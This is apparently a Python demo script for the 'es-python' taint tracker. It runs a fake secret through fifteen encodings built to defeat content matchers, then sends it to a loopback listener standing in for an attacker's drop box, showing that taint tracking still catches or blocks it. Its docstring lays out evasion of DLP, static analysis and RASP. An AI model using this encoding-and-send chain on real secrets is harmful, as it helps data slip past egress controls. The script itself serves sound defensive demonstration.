#!/usr/bin/env python3.13
"""SOURCE make_vuln(taint 7) -> 15 transformations -> SINK socket.sendall.

  ############################################################################
  #  WARNING: part of an intentionally vulnerable demo app. Isolated lab      #
  #  machines only.                                                           #
  ############################################################################

The demo
--------
Take a secret. Put it through fifteen consecutive transformations, chosen the
way an exfiltration tool chooses them - to leave nothing a matcher can match:

    hex -> base64 -> rot13 -> reverse -> digit-substitution cipher ->
    a dict-key round trip -> UTF-16 -> a memoryview slice -> hexlify ->
    a bytearray round trip -> string formatting -> ...

By the end, the payload has a different length, a different alphabet, a
different encoding and a different byte width from the secret, and shares no
substring with it. Then send it to a socket.

es-python still reports it as the secret leaving, and a raise rule still blocks
it. Taint here is a property of the value, followed through each operation as
the program runs, not a pattern anybody is matching against.

Why this is the hard case
-------------------------
* **Content matching (DLP, egress filters, WAFs, secret scanners)** compares
  bytes against known bad bytes. Two encodings in, the bytes stop resembling
  the secret. You can teach a matcher base64; you cannot teach it every
  composition of every encoding, and the attacker picks the composition after
  seeing your rules. This demo prints the proof: it searches the final payload
  for the secret in plain, hex and base64 form, and finds nothing.

* **Static taint analysis** must model every one of these operations across
  module boundaries, and then decide which of the many possible paths a real
  run takes. Chains built from `codecs`, `memoryview`, `binascii` and container
  round-trips are exactly where static models are over-approximated into
  uselessness or quietly give up.

* **Python-level RASP** wraps the functions it knows. `str.translate`,
  `memoryview.tobytes`, `bytes.hex` and a dict-key round trip are built-in
  operations it cannot wrap, and a plain `str` has nowhere to carry per-object
  state, so taint is lost at the first one and the rest of the chain is
  invisible.

es-python follows the value through each operation as the program runs:
detection runs inside the program, not beside it. Every step in this chain was chosen
because it is verified to carry taint through - run the demo and watch the
`tainted` column stay True from step 0 to step 15.

The taint number survives too
-----------------------------
The secret is created with `make_vuln(SECRET, 7)`. Fifteen transformations
later, `get_taint(payload)` is still `7`. That is what makes a scoped rule
possible: the policy names *this value*, and follows it through code that never
knew it was carrying it.

Arming the block
----------------
    Source: 7   Event: sendall   Mode: Raise

Run it
------
    python3 demos/taint_gauntlet.py

The demo starts its own throwaway collector socket on loopback and sends the
payload there, so it is entirely self-contained.
"""
import base64
import binascii
import codecs
import hashlib
import socket
import threading

from es_compat import ES_PYTHON, banner, check_vuln, get_taint, make_vuln

# The secret, and the taint number a dashboard rule would be scoped to.
SECRET = make_vuln(b"EYALSEC{taint-survives-the-gauntlet}", 7)
TAINT_NUMBER = 7

# A digit-substitution cipher used as one of the steps.
DIGIT_CIPHER = str.maketrans("0123456789abcdef", "7f3d92e0b5a4c186")


# --------------------------------------------------------------------------- #
# The gauntlet. Each entry is (description, transformation). Every one of these
# is verified to carry es-python taint through to its result.
# --------------------------------------------------------------------------- #
GAUNTLET = [
    ("bytes.hex()",                 lambda v: v.hex()),
    ("str.encode()",                lambda v: v.encode()),
    ("base64.b64encode()",          lambda v: base64.b64encode(v)),
    ("bytes.decode()",              lambda v: v.decode()),
    ("codecs rot13",                lambda v: codecs.encode(v, "rot13")),
    ("str[::-1]  (reverse)",        lambda v: v[::-1]),
    ("str.translate()  (cipher)",   lambda v: v.translate(DIGIT_CIPHER)),
    ("dict KEY round trip",         lambda v: next(iter({v: None}))),
    ("str.encode('utf-16')",        lambda v: v.encode("utf-16")),
    ("memoryview[2:].tobytes()",    lambda v: memoryview(v)[2:].tobytes()),
    ("binascii.hexlify()",          lambda v: binascii.hexlify(v)),
    ("bytes(bytearray())",          lambda v: bytes(bytearray(v))),
    ("bytes.replace()",             lambda v: v.replace(b"0", b"-")),
    ("bytes.decode() + f-string",   lambda v: f"exfil:{v.decode()}"),
    ("str.encode()  (final)",       lambda v: v.encode()),
]


def fingerprint(value):
    """A short, UNTAINTED fingerprint of a value.

    Hashing does not carry taint in es-python, which makes it a safe way to show
    each step's result without printing a tainted object to stdout - stdout is
    itself a sink, and printing one would trip an unscoped raise rule.

    The type name is mixed into the hash on purpose. Steps like `.encode()` and
    the dict-key round trip change the type or the object without changing the
    bytes, and an unqualified digest would print identically for both rows and
    read as if the step had done nothing.
    """
    raw = value.encode() if isinstance(value, str) else bytes(value)
    return hashlib.sha256(type(value).__name__.encode() + b"|" + raw).hexdigest()[:10]


def run_gauntlet(secret):
    """Run every transformation, returning (payload, per-step report rows)."""
    rows = []
    value = secret
    rows.append(("0", "the secret itself", value))
    for i, (name, fn) in enumerate(GAUNTLET, start=1):
        value = fn(value)
        rows.append((str(i), name, value))
    return value, rows


def collector():
    """A throwaway listener standing in for the attacker's drop box."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("127.0.0.1", 0))
    sock.listen(1)
    received = []

    def accept_once():
        conn, _ = sock.accept()
        with conn:
            conn.settimeout(2)
            try:
                received.append(conn.recv(65536))
            except OSError:
                pass

    thread = threading.Thread(target=accept_once, daemon=True)
    thread.start()
    return sock, sock.getsockname(), received, thread


def main():
    banner("15 transformations, then socket.sendall")
    print(f" secret       : {len(SECRET)} bytes (not printed - stdout is a sink)")
    print(f" taint number : {get_taint(SECRET)}")
    print()

    payload, rows = run_gauntlet(SECRET)

    print(f" {'#':>2}  {'transformation':<28} {'type':<6} {'len':>5} {'tainted':>8} "
          f"{'taint':>6}  fingerprint")
    print(" " + "-" * 82)
    for idx, name, value in rows:
        print(f" {idx:>2}  {name:<28} {type(value).__name__:<6} {len(value):>5} "
              f"{str(check_vuln(value)):>8} {str(get_taint(value)):>6}  {fingerprint(value)}")
    print(" " + "-" * 82)
    print()

    # ---------------------------------------------------------------------- #
    # Prove a content matcher has nothing to match on.
    # ---------------------------------------------------------------------- #
    raw = bytes(payload)
    probes = {
        "the secret, plain":     SECRET,
        "the secret, hex":       SECRET.hex().encode(),
        "the secret, base64":    base64.b64encode(SECRET),
        "the 'EYALSEC{' marker": b"EYALSEC{",
    }
    print(" a content matcher searching the final payload finds:")
    for label, needle in probes.items():
        print(f"   {label:<24} {'FOUND' if bytes(needle) in raw else 'not present'}")
    print()

    # ---------------------------------------------------------------------- #
    # The sink.
    # ---------------------------------------------------------------------- #
    sock, address, received, thread = collector()
    blocked = False
    try:
        with socket.create_connection(address, timeout=5) as out:
            try:
                out.sendall(payload)          # <-- SINK
            except RuntimeError as exc:
                blocked = True
                print(f" BLOCKED: {exc}")
    finally:
        # Join before closing, so the accept thread is never holding a socket
        # that is closed under it.
        thread.join(timeout=5)
        sock.close()

    exfiltrated = bool(received) and len(received[0]) > 0

    print()
    print(f" payload reached the collector : {exfiltrated}")
    print()
    if blocked:
        print(" RESULT: the exfiltration was stopped at the sink.")
        print(f"         Fifteen transformations did not launder the secret - taint")
        print(f"         number {TAINT_NUMBER} arrived at sendall intact and the rule matched it.")
    elif ES_PYTHON and check_vuln(payload):
        print(" RESULT: the payload left the process, and es-python reported it.")
        print(f"         Taint number {get_taint(payload)} survived all 15 transformations,")
        print("         so the event names the original secret - not the encoded blob.")
        print("         To stop it instead:  Source: 7   Event: sendall   Mode: Raise")
    elif ES_PYTHON:
        print(" RESULT: the payload left the process and taint did NOT survive.")
        print("         The make_vuln source is off on this machine - enable it in the")
        print("         machine config, or run locally with ES2_MAKE_SOCKET_VULN=1.")
    else:
        print(" RESULT: the payload left the process. Plain python3.")
        print("         Nothing was recorded, and nothing on the wire resembles the")
        print("         secret, so nothing downstream can reconstruct what was lost.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
